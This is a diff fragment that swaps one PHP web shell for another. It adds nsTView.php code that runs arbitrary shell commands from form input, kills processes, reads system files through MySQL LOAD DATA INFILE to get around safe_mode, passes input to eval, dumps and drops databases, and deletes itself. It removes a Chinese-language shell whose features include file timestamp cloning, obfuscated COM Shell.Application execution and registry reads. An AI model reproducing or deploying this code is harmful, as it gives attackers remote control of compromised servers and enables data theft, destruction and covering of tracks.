+mysql_query("DROP TABLE IF EXISTS $delete_table") or die("<font color=red>".mysql_error()."</font>");
+print "<br><b><font color=green>Table [ $delete_table ] :: Deleted success!</font></b>";
+print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1\">";
+}
+# end of delete table
+
+# delete database
+if(isset($_GET['delete_db'])){
+mysql_drop_db($_GET['delete_db']) or die("<font color=red>".mysql_error()."</font>");
+print "<br><b><font color=green>Database ".$_GET['delete_db']." :: Deleted Success!";
+print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1\">";
+}
+# end of delete database
+
+# delete row
+if(isset($_POST['delete_row'])){
+$_POST['delete_row'] = base64_decode($_POST['delete_row']);
+mysql_query("DELETE FROM ".$_GET['tbl']." WHERE ".$_POST['delete_row']) or die("<font color=red>".mysql_error()."</font>");
+$del_result = "<br><b><font color=green>Deleted Success!<br>".$_POST['delete_row'];
+print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\">";
+}
+# end of delete row
+
+
+$vn=$_GET['vn'];
+print "</td><td valign=top>";
+print "<font color=green>Database: $db => $vn</font>";
+
+# edit row
+if(isset($_POST['edit_row'])){
+$edit_row=base64_decode($_POST['edit_row']);
+
+$r_edit = mysql_query("SELECT * FROM $tbl WHERE $edit_row") or die("<font color=red>".mysql_error()."</font>");
+print "<br><br>
+       <table border=0 cellpadding=1 cellspacing=1><tr>
+       <td><b>Row</b></td><td><b>Value</b></td></tr>";
+print  "<form method=post action='$php_self?p=sql&login=".$_GET['login']."&pass=".$_GET['pass']."&adress=".$_GET['adress']."&conn=1&baza=1&tbl=".$_GET['tbl']."&vn=".$_GET['vn']."&db=".$_GET['db']."'>";
+print  "<input type=hidden name=edit_row value='".$_POST['edit_row']."'>";
+print " <input type=radio name=upd value=update checked>Update<br>
+        <input type=radio name=upd value=insert>Insert new<br><br>";
+
+
+$i=0;
+while($mn = mysql_fetch_array($r_edit, MYSQL_ASSOC)){
+foreach($mn as $key =>$val){
+$type  = mysql_field_type($r_edit, $i);
+$len  = mysql_field_len($r_edit, $i);
+$del .= "`$key`='".adds($val)."' AND ";
+$c=strlen($val);
+$val=htmlspecialchars($val, ENT_NOQUOTES);
+$str=" <textarea name='$key' cols=39 rows=5>$val</textarea> ";
+$buff .= "<tr><td bgcolor=silver><b>$key</b><br><font color=green>(<b>$type($len)</b>)</font></td><td>$str</td></tr>";
+$i++;
+}
+
+}
+$delstring=base64_encode($del);
+print "<input type=hidden name=delstring value=\"$delstring\">";
+print "$buff</table><br>";
+print "<br>";
+if(!$_POST['makeupdate']){print "<input type=submit value=Update name=makeupdate></form>";}
+
+
+
+
+if($_POST['makeupdate']){
+if($_POST['upd']=='update'){
+preg_match_all("/name='(.*?)'\scols=39\srows=5>(.*?)<\/textarea>/i",$buff,$matches3);
+$delstring=$_POST['delstring'];
+$delstring=base64_decode($delstring);
+$delstring = substr($delstring, 0, strlen($delstring)-5);
+
+for($i=0; $i<count($matches3[0]); $i++){
+eval("\$".$matches3[1][$i]." = \"".adds2($_POST[$matches3[1][$i]])."\";");
+$total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',";
+}
+$total_str = substr_replace($total_str,"",-1);
+$up_string = "UPDATE `$tbl` SET $total_str WHERE $delstring";
+$up_string = htmlspecialchars($up_string, ENT_NOQUOTES);
+print "<b>PHP var:<br></b>\$sql=\"$up_string\";<br><br>";
+print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\">";
+mysql_query($up_string) or die("<font color=red>".mysql_error()."</font>");
+}#end of make update
+
+
+
+if($_POST['upd']=='insert'){
+preg_match_all("/name='(.*?)'\scols=39\srows=5>(.*?)<\/textarea>/i",$buff,$matches3);
+$delstring=$_POST['delstring'];
+$delstring=base64_decode($delstring);
+$delstring = substr($delstring, 0, strlen($delstring)-5);
+
+for($i=0; $i<count($matches3[0]); $i++){
+eval("\$".$matches3[1][$i]." = \"".adds2($_POST[$matches3[1][$i]])."\";");
+$total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',,";
+}
+
+$total_str = ",,".$total_str;
+
+preg_match_all("/,(.*?)='(.*?)',/i",$total_str,$matches4);
+
+for($i=0; $i<count($matches4[1]); $i++){
+        $matches4[1][0]=str_replace(",","",$matches4[1][0]);
+        $total_m_i .= "`".$matches4[1][$i]."`,";
+        $total_m_x .= "'".$matches4[2][$i]."',";
+}
+$total_m_i = substr($total_m_i, 0, strlen($total_m_i)-1);
+$total_m_x = substr($total_m_x, 0, strlen($total_m_x)-1);
+
+$make_insert="INSERT INTO `$tbl` ($total_m_i) VALUES ($total_m_x)";
+mysql_query($make_insert) or die("<font color=red>".mysql_error()."</font>");
+print "<b>PHP var:<br></b>\$sql=\"$make_insert\";<br><br>";
+print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\">";
+}#end of insert
+}#end of update
+}
+# end of edit row
+
+
+# insert new line
+if($_GET['ins_new_line']){
+$qn = mysql_query('SHOW FIELDS FROM '.$tbl) or die("<font color=red>".mysql_error()."</font>");
+print "<form method=post action='$php_self?p=sql&login=".$_GET['login']."&pass=".$_GET['pass']."&adress=".$_GET['adress']."&conn=1&baza=1&tbl=".$_GET['tbl']."&vn=".$_GET['vn']."&db=".$_GET['db']."&ins_new_line=1'>
+Insert new line in <b>$tbl</b> table</b><Br><br>";
+print "<table>";
+while ($new_line = mysql_fetch_array($qn, MYSQL_ASSOC)) {
+foreach ($new_line as $key =>$next) {
+$buff .= "$next ";
+}
+$expl=explode(" ",$buff);
+$buff2 .= $expl[0]." ";
+print "<tr><td bgcolor=silver><b>$expl[0]</b><br><font color=green>(<b>$expl[1]</b>)</font></td>
+<td><textarea name='$expl[0]' cols=39 rows=5></textarea>
+</td></tr>";
+unset($buff);
+}
+print "</table>
+<center><input type=submit value=Insert name=mk_ins></form></center>";
+if($_POST['mk_ins']){
+preg_match_all("/(.*?)\s/i",$buff2,$matches3);
+for($i=0; $i<count($matches3[0]); $i++){
+eval("\$".$matches3[1][$i]." = \"".adds2($_POST[$matches3[1][$i]])."\";");
+$total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',,";
+}
+
+$total_str = ",,".$total_str;
+preg_match_all("/,(.*?)='(.*?)',/i",$total_str,$matches4);
+
+for($i=0; $i<count($matches4[1]); $i++){
+        $matches4[1][0]=str_replace(",","",$matches4[1][0]);
+        $total_m_i .= "`".$matches4[1][$i]."`,";
+        $total_m_x .= "'".$matches4[2][$i]."',";
+}
+$total_m_i = substr($total_m_i, 0, strlen($total_m_i)-1);
+$total_m_x = substr($total_m_x, 0, strlen($total_m_x)-1);
+
+$make_insert="INSERT INTO `$tbl` ($total_m_i) VALUES ($total_m_x)";
+mysql_query($make_insert) or die("<font color=red>".mysql_error()."</font>");
+print "<b>PHP var:<br></b>\$sql=\"$make_insert\";<br><br>";
+print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\">";
+}#end of mk ins
+}#end of ins new line
+
+
+
+
+
+
+if(isset($_GET['rename_table'])){
+$rename_table=$_GET['rename_table'];
+print "<br><br>Rename <b>$rename_table</b> to<br><br>
+<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$rename_table'>
+<input name=new_name size=30><center><br>
+<input type=submit value=Rename></center>
+</form>
+";
+
+if(isset($_POST['new_name'])){
+mysql_select_db($db) or die("<font color=red>".mysql_error()."</font>");
+mysql_query("RENAME TABLE $rename_table TO ".$_POST['new_name']) or die("<font color=red>".mysql_error()."</font>");
+print "<br><font color=green>Table <b>$rename_table</b> renamed to <b>".$_POST['new_name']."</b></font>";
+print "<meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&db=$db\">";
+}
+
+}#end of rename
+
+
+# dump table
+if($_GET['dump']){
+if(!is_writable($f_d)){die("<br><br><font color=red>This folder $f_d isnt writable!<br>Cannot make dump.<br><br>
+<font color=green><b>You can change temp folder for dump file in your browser!<br>
+<font color=red>Change variable &f_d=(here writable directory, expl: /tmp or c:/windows/temp)</font><br>
+Then press enter</b></font>
+</font>");}
+mysql_select_db($db) or die("<font color=red>".mysql_error()."</font>");
+$fp = fopen($f_d."/".$f,"w");
+fwrite($fp, "# nsTView.php v$ver
+# Web: http://nst.void.ru
+# Dump from: ".$_SERVER["SERVER_NAME"]." (".$_SERVER["SERVER_ADDR"].")
+# MySQL version: ".mysql_get_server_info()."
+# PHP version: ".phpversion()."
+# Date: ".date("d.m.Y - H:i:s")."
+# Dump db ( $db ) Table ( $tbl )
+# --- eof ---
+
+");
+$que = mysql_query("SHOW CREATE TABLE `$tbl`") or die("<font color=red>".mysql_error()."</font>");
+$row = mysql_fetch_row($que);
+fwrite($fp, "DROP TABLE IF EXISTS `$tbl`;\r\n");
+$row[1]=str_replace("\n","\r\n",$row[1]);
+fwrite($fp, $row[1].";\r\n\r\n");
+$que = mysql_query("SELECT * FROM `$tbl`");
+if(mysql_num_rows($que)>0){
+while($row = mysql_fetch_assoc($que)){
+$keys = join("`, `", array_keys($row));
+$values = array_values($row);
+foreach($values as $k=>$v) {$values[$k] = adds2($v);}
+$values = implode("', '", $values);
+$sql = "INSERT INTO `$tbl`(`$keys`) VALUES ('".$values."');\r\n";
+fwrite($fp, $sql);
+}
+}
+fclose($fp);
+print "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&dump_download=1&f_d=$f_d/\">";
+}#end of dump
+
+
+
+
+# db dump
+if($_GET['dump_db']){
+$c=mysql_num_rows(mysql_list_tables($db));
+if($c>=1){
+print "<br><br>&nbsp;&nbsp;&nbsp;Dump database <b>$db</b>";
+}else{
+print "<br><br><font color=red>Cannot dump database. No tables exists in <b>$db</b> db.</font>";
+die;
+}
+if(sizeof($tabs)==0){
+$res = mysql_query("SHOW TABLES FROM $db");
+if(mysql_num_rows($res)>0){
+while($row=mysql_fetch_row($res)){
+$tabs[] .= $row[0];
+}
+}
+}
+$fp = fopen($f_d."/".$f,"w");
+fwrite($fp, "# nsTView.php v$ver
+# Web: http://nst.void.ru
+# Dump from: ".$_SERVER["SERVER_NAME"]." (".$_SERVER["SERVER_ADDR"].")
+# MySQL version: ".mysql_get_server_info()."
+# PHP version: ".phpversion()."
+# Date: ".date("d.m.Y - H:i:s")."
+# Dump db ( $db )
+# --- eof ---
+
+");
+foreach($tabs as $tab) {
+fwrite($fp,"DROP TABLE IF EXISTS `$tab`;\r\n");
+$res = mysql_query("SHOW CREATE TABLE `$tab`");
+$row = mysql_fetch_row($res);
+$row[1]=str_replace("\n","\r\n",$row[1]);
+fwrite($fp, $row[1].";\r\n\r\n");
+$res = mysql_query("SELECT * FROM `$tab`");
+if(mysql_num_rows($res)>0){
+while($row=mysql_fetch_assoc($res)){
+$keys = join("`, `", array_keys($row));
+$values = array_values($row);
+foreach($values as $k=>$v) {$values[$k] = adds2($v);}
+$values = join("', '", $values);
+$sql = "INSERT INTO `$tab`(`$keys`) VALUES ('$values');\r\n";
+fwrite($fp, $sql);
+}}
+fwrite($fp, "\r\n\r\n\r\n");
+}
+fclose($fp);
+print "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&dump_download=1&f_d=$f_d/\">";
+}#end of db dump
+
+
+
+
+
+
+$vnutr=$_GET['vnutr'];
+$tbl=$_GET['tbl'];
+if($vnutr and !$_GET['ins_new_line']){
+print "<table cellpadding=0 cellspacing=1><tr><td>";
+
+mysql_select_db($db) or die(mysql_error());
+$c=mysql_query ("SELECT COUNT(*) FROM $tbl");
+$cfa=mysql_fetch_array($c);
+mysql_free_result($c);
+print "
+Total: $cfa[0]
+<form>
+From: <input name=from size=3 value=0>
+To: <input name=to size=3 value='$cfa[0]'>
+<input type=submit name=show value=Show>
+<input type=hidden name=vnutr value=1>
+<input type=hidden name=vn value='$vn'>
+<input type=hidden name=db value='$db'>
+<input type=hidden name=login value='$login'>
+<input type=hidden name=pass value='$pass'>
+<input type=hidden name=adress value='$adress'>
+<input type=hidden name=conn value=1>
+<input type=hidden name=baza value=1>
+<input type=hidden name=p value=sql>
+<input type=hidden name=tbl value='$tbl'>
+ [<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl'>DOWNLOAD</a>] [<a href='$php_self?to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl&ins_new_line=1'>INSERT</a>] [<a href='$php_self?to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl&dump=1&f_d=$d'>DUMP</a>]
+</form></td></tr></table>";
+$vn=$_GET['vn'];
+$from=$_GET['from'];
+$to=$_GET['to'];
+$from=$_GET['from'];
+$to=$_GET['to'];
+if(!isset($from)){$from=0;}
+if(!isset($to)){$to=50;}
+$query = "SELECT * FROM $vn LIMIT $from,$to";
+$result = mysql_query($query);
+$result1= mysql_query($query);
+print $del_result;
+print "<table cellpadding=0 cellspacing=1 border=1><tr><td></td>";
+for ($i=0;$i<mysql_num_fields($result);$i++){
+$name=mysql_field_name($result,$i);
+$type  = mysql_field_type($result, $i);
+$len  = mysql_field_len($result, $i);
+print "<td bgcolor=#BCE0FF> $name (<b>$type($len)</b>)</td>";
+}
+print "</tr><pre>";
+
+while($mn = mysql_fetch_array($result, MYSQL_ASSOC)){
+foreach($mn as $key=>$inside){
+$buffer1 .= "`$key`='".adds($inside)."' AND ";
+$b1 .= "<td>".htmlspecialchars($inside, ENT_NOQUOTES)."&nbsp;</td>";
+}
+$buffer1  = substr($buffer1, 0, strlen($buffer1)-5);
+$buffer1  = base64_encode($buffer1);
+print "<td>
+<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&vnutr=1&baza=1&vn=$vn&db=$db'>
+<input type=hidden name=delete_row value='$buffer1'>
+<input type=submit value=Del onclick='return confirm(\"DELETE ?\")' style='border:1px; background-color:white;'>
+</form><form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&baza=1&vn=$vn&db=$db'>
+<input type=hidden name=edit_row value='$buffer1'>
+<input type=submit value=Edit style='border:1px;background-color:green;'>
+</form>
+</td>\r\n";
+print $b1;
+print "</tr>";
+unset($b1);
+unset($buffer1);
+}
+
+
+
+mysql_free_result($result);
+print "</table>";
+} #end vnutr
+print "</td></tr></table>";
+} # end $conn
+
+
+###   end of sql
+print "</tr></td></table> </td></tr></table>";
+print $copyr;
+die;
+}
+
+
+@$p=$_GET['p'];
+if(@$_GET['p']=="selfremover"){
+        print "<tr><td>";
+print "<font color=red face=verdana size=1>Are you sure?<br>
+<a href='$php_self?p=yes'>Yes</a> | <a href='$php_self?'>No</a><br>
+Remove: <u>";
+$path=__FILE__;
+print $path;
+print " </u>?</td></tr></table>";
+die;
+}
+
+if($p=="yes"){
+$path=__FILE__;
+@unlink($path);
+$path=str_replace("\\","/",$path);
+if(file_exists($path)){$hmm="NOT DELETED!!!";
+print "<tr><td><font color=red>FILE $path NOT DELETED</td></tr>";
+}else{$hmm="DELETED";}
+print "<script>alert('$path $hmm');</script>";
+
+}
+
+
+
+if($os=="unix"){
+function fastcmd(){
+global $fast_commands;
+$c_f=explode("\n",$fast_commands);
+$c_f=count($c_f)-2;
+print "
+<form method=post>
+Total commands: $c_f<br>
+<select name=sh3>";
+
+$c=substr_count($fast_commands," (nst) ");
+for($i=0; $i<=$c; $i++){
+       $expl2=explode("\r\n",$fast_commands);
+        $expl=explode(" (nst) ",$expl2[$i]);
+        if(trim($expl[1])!=""){
+        print "<option value='".trim($expl[1])."'>$expl[0]</option>\r\n";
+   }
+}
+
+print "</select><br>
+<input type=submit value=Exec>
+</form>
+";
+}
+}#end of os unix
+
+
+if($os=="win"){
+function fastcmd(){
+global $fast_commands_win;
+$c_f=explode("\n",$fast_commands_win);
+$c_f=count($c_f)-2;
+print "
+<form method=post>
+Total commands: $c_f<br>
+<select name=sh3>";
+
+$c=substr_count($fast_commands_win," (nst) ");
+for($i=0; $i<=$c; $i++){
+       $expl2=explode("\r\n",$fast_commands_win);
+        $expl=explode(" (nst) ",$expl2[$i]);
+        if(trim($expl[1])!=""){
+        print "<option value='".trim($expl[1])."'>$expl[0]</option>\r\n";
+   }
+}
+
+print "</select><br>
+<input type=submit value=Exec>
+</form>
+";
+}
+}#end of os win
+
+
+echo "
+<tr><td>";
+if(@$_GET['sh311']=="1"){echo "<center>cmd<br>pwd:
+";
+chdir($d);
+echo getcwd()."<br><br>
+Fast cmd:<br>";
+fastcmd();
+if($os=="win"){$d=str_replace("/","\\\\",$d);}
+print "
+<a href=\"javascript:cwd('$d ')\">Insert pwd</a>
+<form name=sh311Form method=post><input name=sh3 size=110></form></center><br>
+";
+if(@$_POST['sh3']){
+$sh3=$_POST['sh3'];
+echo "<pre>";
+print `$sh3`;
+echo "</pre>";
 }
 }
 
-// 克隆时间
-elseif ($_POST['do'] == 'domodtime') {
-	if (!@file_exists($_POST['curfile'])) {
-		echo "要修改的文件不存在!";
-	} else {
-		if (!@file_exists($_POST['tarfile'])) {
-			echo "要参照的文件不存在!";
-		} else {
-			$time=@filemtime($_POST['tarfile']);
-			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." 的修改时间成功改为 ".date("Y-m-d H:i:s",$time)." !" : "文件的修改时间修改失败!";
-		}
-	}
+if(@$_GET['sh311']=="2"){
+echo "<center>cmd<br>
+pwd:
+";
+chdir($d);
+echo getcwd()."<br><br>
+Fast cmd:<br>";
+fastcmd();
+if($os=="win"){$d=str_replace("/","\\\\",$d);}
+print "
+<a href=\"javascript:cwd('$d ')\">Insert pwd</a>
+<form name=sh311Form method=post><input name=sh3 size=110></form></center><br>";
+if(@$_POST['sh3']){
+$sh3=$_POST['sh3'];
+echo "<pre>"; print `$sh3`; echo "</pre>";}
+echo $copyr;
+exit;}
+
+if(@$_GET['delfl']){
+@$delfolder=$_GET['delfolder'];
+echo "DELETE FOLDER: <font color=red>".@$_GET['delfolder']."</font><br>
+(All files must be writable)<br>
+<a href='$php_self?deldir=1&dir=".@$delfolder."&rback=".@$_GET['rback']."'>Yes</a> || <a href='$php_self?d=$d'>No</a><br><br>
+";
+echo $copyr;
+exit;
 }
 
-// 自定义时间
-elseif ($_POST['do'] == 'modmytime') {
-	if (!@file_exists($_POST['curfile'])) {
-		echo "要修改的文件不存在!";
-	} else {
-		$year=$_POST['year'];
-		$month=$_POST['month'];
-		$data=$_POST['data'];		
-		$hour=$_POST['hour'];
-		$minute=$_POST['minute'];
-		$second=$_POST['second'];
-		if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {
-			$time=strtotime("$data $month $year $hour:$minute:$second");
-			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." 的修改时间成功改为 ".date("Y-m-d H:i:s",$time)." !" : "文件的修改时间修改失败!";
-		}
-	}
+
+$mkdir=$_GET['mkdir'];
+if($mkdir){
+print "<br><b>Create Folder in $d :</b><br><br>
+<form method=post>
+New folder name:<br>
+<input name=dir_n size=30>
+</form><br>
+";
+if($_POST['dir_n']){
+mkdir($d."/".$_POST['dir_n']) or die('Cannot create directory '.$_POST['dir_n']);
+print "<b><font color=green>Directory created success!</font></b>";
+}
+print $copyr;
+die;
 }
 
-// 连接MYSQL
-elseif ($connect) {
-	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
-		echo "数据库连接成功!";
-		mysql_close();
-	} else {
-		echo mysql_error();
-	}
+
+$mkfile=$_GET['mkfile'];
+if($mkfile){
+print "<br><b>Create file in $d :</b><br><br>
+<form method=post>
+File name:<br>
+(example: hello.txt , hello.php)<br>
+<input name=file_n size=30>
+</form><br>
+";
+if($_POST['file_n']){
+$fp=fopen($d."/".$_POST['file_n'],"w") or die('Cannot create file '.$_POST['file_n']);
+fwrite($fp,"");
+print "<b><font color=green>File created success!</font></b>";
+}
+print $copyr;
+die;
 }
 
-// 执行SQL语句
-elseif ($_POST['do'] == 'query') {
-	@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
-	@mysql_select_db($dbname) or die("选择数据库失败");
-	$result = @mysql_query($_POST['sql_query']);
-	echo ($result) ? "SQL语句成功执行!" : "出错: ".mysql_error();
-	mysql_close();
+
+$ps_table=$_GET['ps_table'];
+if($ps_table){
+
+if($_POST['kill_p']){
+exec("kill -9 ".$_POST['kill_p']);
 }
 
-// 备份操作
-elseif ($_POST['do'] == 'backupmysql') {
-	if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
-		echo "请选择欲备份的数据表和备份方式!";
-	} else {
-		if ($_POST['backuptype'] == 'server') {
-			@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
-			@mysql_select_db($dbname) or die("选择数据库失败");	
-			$table = array_flip($_POST['table']);
-			$filehandle = @fopen($path,"w");
-			if ($filehandle) {
-				$result = mysql_query("SHOW tables");
-				echo ($result) ? NULL : "出错: ".mysql_error();
-				while ($currow = mysql_fetch_array($result)) {
-					if (isset($table[$currow[0]])) {
-						sqldumptable($currow[0], $filehandle);
-						fwrite($filehandle,"\n\n\n");
-					}
-				}
-				fclose($filehandle);
-				echo "数据库已成功备份到 <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
-				mysql_close();
-			} else {
-				echo "备份失败,请确认目标文件夹是否具有可写权限!";
-			}
-		}
-	}
+$str=`ps aux`;
+
+# You can put here preg_match_all for other distrib/os
+preg_match_all("/(?:.*?)([0-9]{1,7})(.*?)\s\s\s[0-9]:[0-9][0-9]\s(.*)/i",$str,$matches);
+
+
+print "<br><b>PS Table :: Fast kill program<br>
+(p.s: Tested on Linux slackware 10.0)<br>
+<br></b>";
+print "<center><table border=1>";
+for($i=0; $i<count($matches[3]); $i++){
+$expl=explode(" ",$matches[0][$i]);
+print "<tr><td>$expl[0]</td><td>PID: ".$matches[1][$i]." :: ".$matches[3][$i]."</td><form method=post><td><font color=red>Kill: <input type=submit name=kill_p value=".trim($matches[1][$i])."></td></form></tr>";
+}#end of for
+print "</table></center><br><br>";
+unset($str);
+print $copyr;
+die;
+}#end of ps table
+
+
+$read_file_safe_mode=$_GET['read_file_safe_mode'];
+if($read_file_safe_mode){
+
+if(!isset($_POST['l'])){$_POST['l']="root";}
+
+print "<br>
+Read file content using MySQL - when <b>safe_mode</b>, <b>open_basedir</b> is <font color=green>ON</font><Br>
+<form method=post>
+<table>
+<tr><td>Addr:</td><Td> <input name=serv_ip value='127.0.0.1'><input name=port value='3306' size=6></td></tr>
+<tr><td>Login:</td><td><input name=l value=".$_POST['l']."></td></tr>
+<tr><td>Passw:</td><td><input name=p value=".$_POST['p']."></td></tr></table>
+(example: /etc/hosts)<br>
+<input name=read_file size=45><br>
+<input type=submit value='Show content'>
+</form>
+<br>";
+
+if($_POST['read_file']){
+$read_file=$_POST['read_file'];
+@mysql_connect($_POST['serv_ip'].":".$_POST['port'],$_POST['l'],$_POST['p']) or die("<font color=red>".mysql_error()."</font>");
+mysql_create_db("tmp_bd_file") or die("<font color=red>".mysql_error()."</font>");
+mysql_select_db("tmp_bd_file") or die("<font color=red>".mysql_error()."</font>");
+mysql_query('CREATE TABLE `tmp_file` ( `file` LONGBLOB NOT NULL );') or die("<font color=red>".mysql_error()."</font>");
+mysql_query("LOAD DATA INFILE \"".addslashes($read_file)."\" INTO TABLE tmp_file");
+$query = "SELECT * FROM tmp_file";
+$result = mysql_query($query) or die("<font color=red>".mysql_error()."</font>");
+print "<b>File content</b>:<br><br>";
+for($i=0;$i<mysql_num_fields($result);$i++){
+$name=mysql_field_name($result,$i);}
+while($line=mysql_fetch_array($result, MYSQL_ASSOC)){
+foreach ($line as $key =>$col_value) {
+print htmlspecialchars($col_value)."<br>";}}
+mysql_free_result($result);
+mysql_drop_db("tmp_bd_file") or die("<font color=red>".mysql_error()."</font>");
 }
 
-// 打包下载 PS:文件太大可能非常慢
-// Thx : 小花
-elseif($downrar) {
-	if (!empty($dl)) {
-		$dfiles="";
-		foreach ($dl AS $filepath=>$value) {
-			$dfiles.=$filepath.",";
-		}
-		$dfiles=substr($dfiles,0,strlen($dfiles)-1);
-		$dl=explode(",",$dfiles);
-		$zip=new PHPZip($dl);
-		$code=$zip->out;		
-		header("Content-type: application/octet-stream");
-		header("Accept-Ranges: bytes");
-		header("Accept-Length: ".strlen($code));
-		header("Content-Disposition: attachment;filename=".$_SERVER['HTTP_HOST']."_Files.tar.gz");
-		echo $code;
-		exit;
-	} else {
-		echo "请选择要打包下载的文件!";
-	}
+
+print $copyr;
+die;
+}#end of read_file_safe_mode
+
+
+# sys
+$wich_f=$_GET['wich_f'];
+$delete=$_GET['delete'];
+$del_f=$_GET['del_f'];
+$chmod=$_GET['chmod'];
+$ccopy_to=$_GET['ccopy_to'];
+
+
+# delete
+if(@$_GET['del_f']){
+if(!isset($delete)){
+print "<font color=red>Delete this file?</font><br>
+<b>$d/$wich_f<br><br></b>
+<a href='$php_self?d=$d&del_f=$wich_f&delete=1'>Yes</a> / <a href='$php_self?d=$d'>No</a>
+";}
+if($delete==1){
+unlink($d."/".$del_f);
+print "<b>File: <font color=green>$d/$del_f DELETED!</font></b>
+<br><b> <a href='$php_self?d=$d'># BACK</a>
+";
+}
+echo $copyr;
+exit;
 }
 
-// Shell.Application 运行程序
-elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {
-	$shell= &new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');
-	$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);
-	echo ($a=='0') ? "程序已经成功执行!" : "程序运行失败!";
+
+# copy to
+if($ccopy_to){
+$wich_f=$_POST['wich_f'];
+$to_f=$_POST['to_f'];
+print "<font color=green>Copy file:<br>
+$d/$ccopy_to</font><br>
+<br>
+<form method=post>
+File:<br><input name=wich_f size=100 value='$d/$ccopy_to'><br><br>
+To:<br><input name=to_f size=100 value='$d/nst_$ccopy_to'><br><br>
+<input type=submit value=Copy></form><br><br>
+";
+
+if($to_f){
+@copy($wich_f,$to_f) or die("<font color=red>Cannot copy!!! maybe folder is not writable</font>");
+print "<font color=green><b>Copy success!!!</b></font><br>";
 }
 
-// 查看PHP配置参数状况
-elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {
-	echo "配置参数 ".$_POST['phpvarname']." 检测结果: ".getphpcfg($_POST['phpvarname'])."";
+echo $copyr;
+exit;
 }
 
-// 读取注册表
-elseif(($regread) AND !empty($_POST['readregname'])) {
-	$shell= &new COM('WSc'.'rip'.'t.Sh'.'ell');
-	var_dump(@$shell->RegRead($_POST['readregname']));
+
+# chmod
+if(@$_GET['chmod']){
+$perms = @fileperms($d."/".$wich_f);
+print "<b><font color=green>CHMOD file $d/$wich_f</font><br>
+<br><center>This file chmod is</b> ";
+print perm($perms);
+print "</center>
+<br>";
+$chmd=<<<HTML
+
+<script>
+<!--
+
+function do_chmod(user) {
+        var field4 = user + "4";
+        var field2 = user + "2";
+        var field1 = user + "1";
+        var total = "t_" + user;
+        var symbolic = "sym_" + user;
+        var number = 0;
+        var sym_string = "";
+
+        if (document.chmod[field4].checked == true) { number += 4; }
+        if (document.chmod[field2].checked == true) { number += 2; }
+        if (document.chmod[field1].checked == true) { number += 1; }
+
+        if (document.chmod[field4].checked == true) {
+                sym_string += "r";
+        } else {
+                sym_string += "-";
+        }
+        if (document.chmod[field2].checked == true) {
+                sym_string += "w";
+        } else {
+                sym_string += "-";
+        }
+        if (document.chmod[field1].checked == true) {
+                sym_string += "x";
+        } else {
+                sym_string += "-";
+        }
+
+        if (number == 0) { number = ""; }
+        document.chmod[total].value = number;
+        document.chmod[symbolic].value = sym_string;
+
+        document.chmod.t_total.value = document.chmod.t_owner.value + document.chmod.t_group.value + document.chmod.t_other.value;
+        document.chmod.sym_total.value = "-" + document.chmod.sym_owner.value + document.chmod.sym_group.value + document.chmod.sym_other.value;
+}
+//-->
+</script>
+
+
+
+<form name="chmod" method=post>
+<p><table cellpadding="0" cellspacing="0" border="0" bgcolor="silver"><tr><td width="100%" valign="top"><table width="100%" cellpadding="5" cellspacing="2" border="0"><tr><td width="100%" bgcolor="#008000" align="center" colspan="5"><font color="#ffffff" size="3"><b>CHMOD (File Permissions)</b></font></td></tr>
+        <tr bgcolor="gray">
+                <td align="left"><b>Permission</b></td>
+                <td align="center"><b>Owner</b></td>
+                <td align="center"><b>Group</b></td>
+                <td align="center"><b>Other</b></td>
+                <td bgcolor="#dddddd" rowspan="4"> </td>
+        </tr><tr bgcolor="#dddddd">
+                <td align="left" nowrap><b>Read</b></td>
